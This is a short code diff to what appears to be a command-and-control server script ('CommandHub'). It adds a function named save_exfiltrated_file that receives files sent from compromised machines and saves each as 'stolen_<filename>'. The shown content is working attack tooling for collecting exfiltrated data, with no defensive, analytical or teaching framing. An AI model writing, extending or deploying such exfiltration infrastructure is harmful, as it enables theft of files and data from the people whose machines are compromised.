@@ -243,3 +243,18 @@ if __name__ == '__main__':
 
     hub = CommandHub(host=args.host, port=args.port)
     hub.start()
+def save_exfiltrated_file(conn, filename):
+    # Receive the size first
+    header = conn.recv(1024).decode()
+    if header.startswith("SIZE"):
+        file_size = int(header.split()[1])
+        print(f"[*] Incoming file: {filename} ({file_size} bytes)")
+        
+        # Receive the actual data in chunks
+        with open(f"stolen_{filename}", "wb") as f:
+            remaining = file_size
+            while remaining > 0:
+                chunk = conn.recv(min(remaining, 4096))
+                f.write(chunk)
+                remaining -= len(chunk)
+        print(f"[+] {filename} saved as stolen_{filename}")
